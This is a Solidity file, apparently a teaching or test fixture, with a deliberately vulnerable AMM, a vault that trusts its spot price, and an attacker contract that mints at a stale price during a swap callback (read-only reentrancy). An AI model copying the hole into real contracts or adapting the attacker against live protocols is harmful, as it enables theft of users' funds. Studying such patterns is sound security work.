// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAMMSwapCallback {
    function onSwap() external;
}

contract VulnerableAMM {
    uint256 public reserveIn;
    uint256 public reserveOut;

    function seed(uint256 inReserve, uint256 outReserve) external {
        reserveIn = inReserve;
        reserveOut = outReserve;
    }

    function spotPrice() external view returns (uint256) {
        return reserveIn * 1e18 / reserveOut;
    }

    function swapOut(uint256 amountOut) external {
        // External interaction before reserve update creates a stale read window.
        IAMMSwapCallback(msg.sender).onSwap();
        reserveOut -= amountOut;
    }
}

contract VictimVaultUsingSpotPrice {
    VulnerableAMM public immutable amm;
    mapping(address => uint256) public minted;

    constructor(VulnerableAMM amm_) {
        amm = amm_;
    }

    function mintAgainstLP(uint256 lpAmount) external {
        uint256 stalePrice = amm.spotPrice();
        minted[msg.sender] += lpAmount * stalePrice / 1e18;
    }
}

contract AMMSpotPriceRORAttacker is IAMMSwapCallback {
    VulnerableAMM public amm;
    VictimVaultUsingSpotPrice public vault;

    function attack(VulnerableAMM amm_, VictimVaultUsingSpotPrice vault_) external {
        amm = amm_;
        vault = vault_;
        amm.swapOut(100 ether);
    }

    function onSwap() external override {
        vault.mintAgainstLP(10 ether);
    }
}
